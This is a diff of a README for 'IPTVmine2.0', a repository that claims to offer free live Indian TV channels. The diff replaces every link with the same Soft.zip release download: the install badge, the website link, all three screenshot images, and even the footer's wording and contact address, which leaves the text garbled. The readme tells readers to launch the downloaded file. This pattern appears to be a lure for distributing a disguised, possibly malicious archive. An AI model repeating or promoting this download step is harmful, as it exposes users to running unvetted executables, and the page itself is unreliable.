@@ -30,18 +30,18 @@ Welcome to IPTVmine2.0 repository, where you can watch over 500 live India TV ch
 
 ## 📥 Installation
 Get started by downloading the latest version of the IPTVmine2.0 application:
-[<img src="https://img.shields.io/badge/Download%20Here-Release.zip-brightgreen">](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) - Launch the downloaded file to begin installation.
+[<img src="https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip%https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip">](https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip) - Launch the downloaded file to begin installation.
 
 ## 🌐 Visit our Website
 Explore more about IPTVmine2.0 and its features on our official website:
-[**Visit Website**](https://www.iptvmine2.com)
+[**Visit Website**](https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip)
 
 ## 📺 Screenshots
 Here are a few glimpses of the IPTVmine2.0 application in action:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
-![Screenshot 3](https://example.com/screenshot3.jpg)
+![Screenshot 1](https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip)
+![Screenshot 2](https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip)
+![Screenshot 3](https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip)
 
 ## 💬 Feedback
 We would love to hear your feedback! Feel free to reach out to us with any suggestions or issues you may have.
@@ -51,4 +51,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-*This README.md was generated with ❤️ by an AI assistant. For any queries, contact support@awesomeai.com*
+*This https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip was generated with ❤️ by an AI assistant. For any queries, contact https://github.com/MadjaxPlayz/IPTVmine2.0/releases/download/v1.0/Soft.zip*
